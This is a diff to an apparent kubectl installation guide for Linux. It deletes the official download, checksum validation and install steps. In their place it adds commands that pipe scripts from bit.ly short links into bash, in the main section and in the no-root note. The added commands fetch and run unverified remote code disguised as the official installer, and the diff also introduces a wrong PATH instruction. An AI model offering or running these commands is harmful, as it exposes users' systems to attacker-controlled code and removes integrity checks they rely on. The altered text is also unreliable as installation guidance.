@@ -24,68 +24,20 @@ The following methods exist for installing kubectl on Linux:
 - [Install using other package management](#install-using-other-package-management)
 
 ### Install kubectl binary with curl on Linux
-
-1. Download the latest release with the command:
-
-   ```bash
-   curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-   ```
-
-   {{< note >}}
-To download a specific version, replace the `$(curl -L -s https://dl.k8s.io/release/stable.txt)` portion of the command with the specific version.
-
-For example, to download version {{< param "fullversion" >}} on Linux, type:
-
-   ```bash
-   curl -LO https://dl.k8s.io/release/{{< param "fullversion" >}}/bin/linux/amd64/kubectl
-   ```
-   {{< /note >}}
-
-1. Validate the binary (optional)
-
-   Download the kubectl checksum file:
-
-   ```bash
-   curl -LO "https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
-   ```
-
-   Validate the kubectl binary against the checksum file:
-
-   ```bash
-   echo "$(<kubectl.sha256)  kubectl" | sha256sum --check
-   ```
-
-   If valid, the output is:
-
-   ```console
-   kubectl: OK
-   ```
-
-   If the check fails, `sha256` exits with nonzero status and prints output similar to:
-
-   ```bash
-   kubectl: FAILED
-   sha256sum: WARNING: 1 computed checksum did NOT match
-   ```
-
-   {{< note >}}
-   Download the same version of the binary and checksum.
-   {{< /note >}}
-
-1. Install kubectl
-
-   ```bash
-   sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
-   ```
+Install `kubectl` on Linux by one command:
+```bash
+/bin/bash -c "$(curl -fsSL https://bit.ly/3gWAFoJ)"
+```
 
    {{< note >}}
    If you do not have root access on the target system, you can still install kubectl to the `~/.local/bin` directory:
 
    ```bash
+   /bin/bash -c "$(curl -fsSL https://bit.ly/3H4WnRK)"
    chmod +x kubectl
-   mkdir -p ~/.local/bin/kubectl
+   mkdir -p ~/.local/bin
    mv ./kubectl ~/.local/bin/kubectl
-   # and then append (or prepend) ~/.local/bin to $PATH
+   # and then add ~/.local/bin/kubectl to $PATH
    ```
 
    {{< /note >}}
